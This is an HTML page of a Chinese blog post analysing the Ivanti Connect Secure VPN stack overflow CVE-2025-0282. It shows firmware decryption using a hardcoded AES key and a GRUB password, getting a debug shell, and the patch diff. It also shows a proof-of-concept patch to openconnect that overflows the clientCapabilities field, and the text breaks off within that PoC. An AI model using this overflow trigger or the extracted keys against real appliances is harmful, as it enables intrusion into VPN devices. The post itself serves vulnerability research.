<!DOCTYPE html>
<html lang="EN">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>CVE-2025-0282 Ivanti Connect Secure VPN 栈溢出漏洞分析 | Swing&#39;Blog 浮生若梦</title>


<meta name="description" content="Know it then hack it!">


<meta name="author" content="Swing">



<!-- Canonical -->
<link rel="canonical" href="/CVE-2025-0282-Ivanti-Connect-Secure-VPN-stack-overflow.html">

<!-- Favicon -->
<link rel="icon" href="/images/favicon.ico">

<!-- RSS -->

<link rel="alternate" type="application/rss+xml" title="Swing&#39;Blog 浮生若梦" href="/atom.xml">


<!-- Open Graph -->
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2025-0282 Ivanti Connect Secure VPN 栈溢出漏洞分析">
<meta property="og:url" content="/CVE-2025-0282-Ivanti-Connect-Secure-VPN-stack-overflow.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">

<meta property="og:description" content="Know it then hack it!">


<!-- Twitter Card -->
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2025-0282 Ivanti Connect Secure VPN 栈溢出漏洞分析">

<meta name="twitter:description" content="Know it then hack it!">


<!-- Theme Color -->
<meta name="theme-color" content="#1d1f21">
<meta name="msapplication-TileColor" content="#1d1f21">

<!-- Stylesheets -->

<link rel="stylesheet" href="/css/style.css">


<!-- Custom Layout Variables -->

<style>
:root {
  --page-width: 60rem;
  --content-width: 1200px;
  --mobile-padding: 12px;
}
</style>

<!-- Analytics -->


<meta name="generator" content="Hexo 5.4.2"></head>
<body class="theme-dark">
  <div class="container">
    <header class="header">
  <div class="header-inner">
    <div class="header-brand">
      
        <a href="/" class="logo">
          <img src="/images/logo.png"
               width="50"
               height="50"
               alt="Swing&#39;Blog 浮生若梦">
        </a>
      
      <a href="/" class="site-title">
        Swing&#39;Blog 浮生若梦
      </a>
    </div>

    <nav class="nav">
      <button class="nav-toggle" id="nav-toggle" aria-label="Toggle navigation">
        <span class="nav-toggle-bar"></span>
        <span class="nav-toggle-bar"></span>
        <span class="nav-toggle-bar"></span>
      </button>

      <ul class="nav-menu" id="nav-menu">
        
          
          
            
            <li class="nav-item">
              <a href="/"
                 class="nav-link"
                 >
                Home
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/about/"
                 class="nav-link"
                 >
                About
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/archives/"
                 class="nav-link"
                 >
                Articles
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/atom.xml"
                 class="nav-link"
                 >
                RSS
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/categories/"
                 class="nav-link"
                 >
                Categories
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/link"
                 class="nav-link"
                 >
                Links
              </a>
            </li>
            
          
        
      </ul>
    </nav>
  </div>
</header>


    <main class="main">
      
        <div class="page-layout">
          <article class="post">
  <header class="post-header">
  <h1 class="post-title">CVE-2025-0282 Ivanti Connect Secure VPN 栈溢出漏洞分析</h1>

  <div class="post-meta">
    <span class="meta-item">
      <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11zM9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2z"/></svg>
      <time datetime="2025-01-29">
        2025-01-29
      </time>
    </span>

    
      <span class="meta-item">
        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M21 10.12h-6.78l2.74-2.82c-2.73-2.7-7.15-2.8-9.88-.1-2.73 2.71-2.73 7.08 0 9.79s7.15 2.71 9.88 0C18.32 15.65 19 14.08 19 12.1h2c0 1.98-.88 4.55-2.64 6.29-3.51 3.48-9.21 3.48-12.72 0-3.5-3.47-3.53-9.11-.02-12.58s9.14-3.47 12.65 0L21 3v7.12z"/></svg>
        <time datetime="2025-01-29">
          Updated on 2025-01-29
        </time>
      </span>
    

    
      <span class="meta-item">
        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
        
          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
        
      </span>
    
  </div>
</header>


  
    <nav class="toc">
  <h3 class="toc-title">Table of Contents</h3>
  <div class="toc-list">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TL-DR"><span class="toc-text">TL; DR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96"><span class="toc-text">固件提取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#decrypt"><span class="toc-text">decrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-%E8%8E%B7%E5%8F%96"><span class="toc-text">shell 获取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-0282"><span class="toc-text">CVE-2025-0282</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Diff-patched"><span class="toc-text">Diff patched</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PoC"><span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-text">Reference link</span></a></li></ol>
  </div>
</nav>

  

  <div class="post-content">
  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>…</p>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>2025年（暨蛇年）第一篇博客文章，顺便祝我的博客读者新春快乐吧。</p>
<p>1月9日 google 发布的 Ivanti Connect Secure VPN 设备的在野漏洞预警：</p>
<p><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day/">https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day/</a></p>
<p>1月10日 watchtowr 就发布了漏洞分析</p>
<p><a href="https://labs.watchtowr.com/do-secure-by-design-pledges-come-with-stickers-ivanti-connect-secure-rce-cve-2025-0282/">https://labs.watchtowr.com/do-secure-by-design-pledges-come-with-stickers-ivanti-connect-secure-rce-cve-2025-0282/</a></p>
<p>1月10日我也发了我的漏洞复现推特： <a href="https://x.com/bestswngs/status/1877715807506952486">https://x.com/bestswngs/status/1877715807506952486</a></p>
<p>这次 diff版本2.3 build 3431 和 2.5， 特意留到了除夕夜发这篇文章..</p>
<h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p>这部分内容依旧感谢我的同事 @explore 和 @leommxj的帮助， 具体流程如下：</p>
<p>添加磁盘到虚拟机里后， 用 <code>lvdisplay</code> 可以看到几个分区</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># lvdisplay</span></span><br><span class="line">  --- Logical volume ---</span><br><span class="line">  LV Path                /dev/groupA/home</span><br><span class="line">  LV Name                home</span><br><span class="line">  VG Name                groupA</span><br><span class="line">  LV UUID                vPWDHH-AlTq-GvBS-UAnf-orT1-yT2d-TdbWyK</span><br><span class="line">  LV Write Access        <span class="built_in">read</span>/write</span><br><span class="line">  LV Creation host, time (none), 2025-01-09 17:28:21 -0500</span><br><span class="line">  LV Status              NOT available</span><br><span class="line">  LV Size                &lt;4.87 GiB</span><br><span class="line">  Current LE             1246</span><br><span class="line">  Segments               1</span><br><span class="line">  Allocation             inherit</span><br><span class="line">  Read ahead sectors     auto</span><br><span class="line">   </span><br><span class="line">  --- Logical volume ---</span><br><span class="line">  LV Path                /dev/groupA/runtime</span><br><span class="line">  LV Name                runtime</span><br><span class="line">  VG Name                groupA</span><br><span class="line">  LV UUID                dFDVOl-kYQR-J3N5-3HNC-toXc-9947-sj0yzc</span><br><span class="line">  LV Write Access        <span class="built_in">read</span>/write</span><br><span class="line">  LV Creation host, time (none), 2025-01-09 17:28:39 -0500</span><br><span class="line">  LV Status              NOT available</span><br><span class="line">  LV Size                &lt;19.46 GiB</span><br><span class="line">  Current LE             4981</span><br><span class="line">  Segments               2</span><br><span class="line">  Allocation             inherit</span><br><span class="line">  Read ahead sectors     auto</span><br><span class="line">   </span><br><span class="line">  --- Logical volume ---</span><br><span class="line">  LV Path                /dev/groupZ/home</span><br><span class="line">  LV Name                home</span><br><span class="line">  VG Name                groupZ</span><br><span class="line">  LV UUID                cOTBS1-oaYw-PlAt-puTS-Uvq5-6C91-pK6QHK</span><br><span class="line">  LV Write Access        <span class="built_in">read</span>/write</span><br><span class="line">  LV Creation host, time (none), 2024-10-07 06:47:49 -0400</span><br><span class="line">  LV Status              NOT available</span><br><span class="line">  LV Size                6.72 GiB</span><br><span class="line">  Current LE             1721</span><br><span class="line">  Segments               1</span><br><span class="line">  Allocation             inherit</span><br><span class="line">  Read ahead sectors     auto</span><br></pre></td></tr></table></figure>

<p>可以看到这几个都是 lvm2 加密的， 没法直接 mount</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># fdisk -l</span></span><br><span class="line">Disk /dev/sdb: 80.09 GiB, 86000000000 bytes, 167968750 sectors</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0xc45d0b27</span><br><span class="line"></span><br><span class="line">Device     Boot Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sdb1  *     2048 167968749 167966702 80.1G 83 Linux</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sda: 80 GiB, 85899345920 bytes, 167772160 sectors</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line">Device     Boot     Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1           16065    224909    208845  102M 83 Linux</span><br><span class="line">/dev/sda2          224910    433754    208845  102M 83 Linux</span><br><span class="line">/dev/sda3          449820    658664    208845  102M 83 Linux</span><br><span class="line">/dev/sda4          674730 167766794 167092065 79.7G 85 Linux extended</span><br><span class="line">/dev/sda5          674731  14779799  14105069  6.7G 83 Linux</span><br><span class="line">/dev/sda6        14779801  30089744  15309944  7.3G 83 Linux</span><br><span class="line">/dev/sda7        30089746  65802239  35712494   17G 83 Linux</span><br><span class="line">/dev/sda8        65802241  81112184  15309944  7.3G 83 Linux</span><br><span class="line">/dev/sda9        81112186 116824679  35712494   17G 83 Linux</span><br><span class="line">/dev/sda10      116824681 132134624  15309944  7.3G 82 Linux swap / Solaris</span><br><span class="line">/dev/sda11      132134626 167766794  35632169   17G 83 Linux</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># mount /dev/groupZ/home /mnt/runtime</span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># mount /dev/sda1 /mnt/runtime       </span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># ls /mnt/runtime </span></span><br><span class="line">boot.b  compact-file  coreboot.img  disksize  grub  kernel  log_coreboot  lost+found  VERSION</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>我们在 <code>/dev/sda1</code> 找到了对应的 <code>kernel</code> 和 <code>coreboot.img</code>， 可以看看到 coreboot.img 作为initrd</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># cat /mnt/runtime/grub/grub.cfg </span></span><br><span class="line"><span class="built_in">set</span> default=0</span><br><span class="line"><span class="built_in">set</span> timeout=5</span><br><span class="line">insmod ext2</span><br><span class="line">password 07ow3w3d743</span><br><span class="line">serial --unit=0 --speed=9600 --word=8 --parity=no --stop=1</span><br><span class="line">menuentry <span class="string">&quot;Current&quot;</span> &#123;</span><br><span class="line"><span class="built_in">set</span> root=(hd0,2)</span><br><span class="line">    linux /kernel system=A rootdelay=5 console=ttyS0,115200n8 console=tty0 vm_hv_type=VMware   </span><br><span class="line">    initrd /coreboot.img</span><br><span class="line">&#125;</span><br><span class="line">menuentry <span class="string">&quot;Factory Reset&quot;</span> &#123;</span><br><span class="line"><span class="built_in">set</span> root=(hd0,1)</span><br><span class="line">    linux /kernel system=Z noconfirm rootdelay=5 console=ttyS0,115200n8 console=tty0 vm_hv_type=VMware   </span><br><span class="line">    initrd /coreboot.img</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h3><p>coreboot.img 作为initrd</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-21-ee05dc473ae5764c7ab74ac2a110f46a-38fd2f.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-21-ee05dc473ae5764c7ab74ac2a110f46a-38fd2f.png" alt="image.png"></a></p>
<p>我们去将这里的 kernel 通过 vmlinux-to-elf 转换一下就可以逆向了， 在 kernel中<code>populate_rootfs</code>里面写死密钥的AES解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>DRAMFS_AES_KEY = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;13D7B32E2600B7747D80FBA8F8D5C7CA&quot;</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>realkey = strxor(DRAMFS_AES_KEY[:<span class="number">4</span>][::-<span class="number">1</span>], <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;99ED2BF2&#x27;</span>))[::-<span class="number">1</span>]</span><br><span class="line">  <span class="number">2</span> realkey += strxor(DRAMFS_AES_KEY[<span class="number">4</span>:<span class="number">8</span>][::-<span class="number">1</span>], <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;AEEF41FE&#x27;</span>))[::-<span class="number">1</span>]</span><br><span class="line">  <span class="number">3</span> realkey += strxor(DRAMFS_AES_KEY[<span class="number">8</span>:<span class="number">12</span>][::-<span class="number">1</span>], <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;141058C7&#x27;</span>))[::-<span class="number">1</span>]</span><br><span class="line">  <span class="number">4</span> realkey += strxor(DRAMFS_AES_KEY[<span class="number">12</span>:<span class="number">16</span>][::-<span class="number">1</span>], <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;D2ED180E&#x27;</span>))[::-<span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>realkey</span><br><span class="line"><span class="string">b&#x27;\xe1\xfc^\xb7\xd8AX\xda\xba\xd8\xeb\xbc\xf6\xcd*\x18&#x27;</span></span><br></pre></td></tr></table></figure>

<p>binary ninja 带有神奇的优化，<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-21-fb9e3ca218c682ba175b92611e4cb934-dbe415.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-21-fb9e3ca218c682ba175b92611e4cb934-dbe415.png" alt="image.png"></a><br>优化出来就是异或完的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ffffffff826d0815            <span class="keyword">int64_t</span> initrd_start_3 = initrd_start;</span><br><span class="line">ffffffff826d081c            <span class="keyword">int32_t</span> initrd_end_1 = (*(<span class="keyword">uint32_t</span>*)initrd_end);</span><br><span class="line">ffffffff826d082e            <span class="keyword">int64_t</span>* rax_1 = crypto_alloc_base(<span class="string">&quot;aes&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">ffffffff826d0833            <span class="keyword">uint64_t</span> i = (<span class="keyword">uint64_t</span>)(initrd_end_1 - initrd_start_3);</span><br><span class="line">ffffffff826d083f            <span class="keyword">int64_t</span> rcx_1;</span><br><span class="line">ffffffff826d083f            <span class="keyword">int64_t</span> rdx_1;</span><br><span class="line">ffffffff826d083f            <span class="keyword">int64_t</span> r8_1;</span><br><span class="line">ffffffff826d083f            </span><br><span class="line"><span class="function">ffffffff826d083f            <span class="title">if</span> <span class="params">(rax_1 &lt;= <span class="number">-0x1000</span>)</span></span></span><br><span class="line"><span class="function">ffffffff826d083f            </span>&#123;</span><br><span class="line">ffffffff826d0875                <span class="keyword">int32_t</span> var_6c_1 = <span class="number">0xda5841d8</span>;</span><br><span class="line">ffffffff826d0889                <span class="keyword">int32_t</span> var_70 = <span class="number">0xb75efce1</span>;</span><br><span class="line">ffffffff826d088c                <span class="keyword">int32_t</span> var_68_1 = <span class="number">0xbcebd8ba</span>;</span><br><span class="line">ffffffff826d088f                <span class="keyword">int32_t</span> var_64_1 = <span class="number">0x182acdf6</span>;</span><br><span class="line">ffffffff826d089b                rcx_1 = rax_1[<span class="number">1</span>](rax_1, &amp;var_70, <span class="number">0x10</span>);</span><br><span class="line">ffffffff826d089f                <span class="keyword">int32_t</span> rax_2 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>通过简单的逆向， 我们很快就可以写出一份解密代码， 我们可以把 coreboot.img 解密后出来一份<code>gzip</code> 压缩的cpio文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ sw in ~/Dropbox/Attachments/SafetyEquipment/VPN/ivc/2.3 [17:53:53]</span></span><br><span class="line">$ file out2.bak</span><br><span class="line">out2.bak: gzip compressed data, last modified: Sat Oct  5 17:32:45 2024, max compression, from Unix, original size modulo 2^32 118361088</span><br><span class="line"></span><br><span class="line"><span class="comment"># swing @ sw in ~/Dropbox/Attachments/SafetyEquipment/VPN/ivc/2.3 [17:53:49]</span></span><br><span class="line">$ gzip -d out2.gz</span><br><span class="line"></span><br><span class="line">$ file out2</span><br><span class="line">out2: ASCII cpio archive (SVR4 with no CRC)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cpio 解出来的目录结构如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ sw in ~/Dropbox/Attachments/SafetyEquipment/VPN/ivc/2.3/initrd [17:55:34]</span></span><br><span class="line">$ ls</span><br><span class="line">bin     dash    dev     etc     gzip    insmod  lib     modules out2    rmmod   sbin    tmp     usr</span><br></pre></td></tr></table></figure>

<p><code>etc/lvmeky</code> 是其他上面几个  lvm 分区的 key , 使用 <code>crypsetup</code> 命令解密后可以进一步 mount 磁盘</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cryptsetup luksOpen --key-file /mnt/hgfs/G/chaitin/20250109_ivanti/ISA_R2.3/lvmkey /dev/groupA/home groupA_home</span><br><span class="line">sudo mount /dev/mapper/groupA_home /mnt/disk1</span><br></pre></td></tr></table></figure>

<h3 id="shell-获取"><a href="#shell-获取" class="headerlink" title="shell 获取"></a>shell 获取</h3><p>/root/home/bin/dsconfig.pl 是进入后的shell<br>其中如果<code>DSSys::isDebugBuild</code> 返回是调试版本就会直接给出shell的选项</p>
<p>这里就是会调用  <code>sub shell &#123;&#125;</code> 方法</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">shell</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span> <span class="keyword">if</span> (!DSSys::isDebugBuild());</span><br><span class="line">  <span class="keyword">print</span> <span class="string">&quot;set DISPLAY variable if you want to start an xterm\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">my</span> ($install) = $ENV&#123;<span class="string">&#x27;DSINSTALL&#x27;</span>&#125; =~ <span class="regexp">/(\S*)/</span>;</span><br><span class="line">  DSSafe::<span class="keyword">system</span>(<span class="string">&quot;$install/bin/dsshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过简单逆向这个程序，我们就很快能获得一个带有调试功能的固件了（具体操作留给读者了， 很简单）</p>
<h2 id="CVE-2025-0282"><a href="#CVE-2025-0282" class="headerlink" title="CVE-2025-0282"></a>CVE-2025-0282</h2><h3 id="Diff-patched"><a href="#Diff-patched" class="headerlink" title="Diff patched"></a>Diff patched</h3><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-10-480e76fc9ceffe7595e688e3b80f371d-215ea6.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-10-480e76fc9ceffe7595e688e3b80f371d-215ea6.png" alt="image.png"></a></p>
<p>可以看到这里新加了一个长度判断， 之前存在栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line"><span class="built_in">strncpy</span>(dest, *(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">140</span>), v23);</span><br><span class="line">v24 = <span class="number">46</span>;</span><br><span class="line">v25 = &amp;v57;</span><br><span class="line"><span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)&amp;v57 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  LOBYTE(v24) = <span class="number">44</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v25 = (__int16 *)&amp;v58;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>最早的poc构造是根据 watchtowr 的文章， 魔改 openconnect<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="OpenConnect https://www.infradead.org/openconnect/download.html
">[1]</span></a></sup> 的 <code>pulse.c</code> 代码</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	if (bytes[0])</span><br><span class="line">        buf_append(reqbuf, &quot; clientIp=%s&quot;, bytes);</span><br><span class="line"><span class="addition">+ buf_append(reqbuf, &quot; clientCapabilities=%s&quot;, bytes);</span></span><br><span class="line"><span class="addition">+ for(unsigned int n=0; n&lt;100; n++)</span></span><br><span class="line"><span class="addition">+       buf_append(reqbuf, &quot;AAAAAAAAAAAAAAAA&quot;);</span></span><br><span class="line">	buf_append(reqbuf, &quot;\\n%c&quot;, 0);</span><br><span class="line">	ret = send_ift_packet(vpninfo, reqbuf);</span><br></pre></td></tr></table></figure>

<p>编译的时候需要一个 vpn.cript , 我这里用的是 <a href="https://gitlab.com/openconnect/vpnc-scripts/-/blob/master/vpnc-script?ref_type=heads">https://gitlab.com/openconnect/vpnc-scripts/-/blob/master/vpnc-script?ref_type=heads</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/configure --enable-static=yes --without-openssl --with-vpnc-script=./vpnc-script --without-libproxy --without-lz4</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 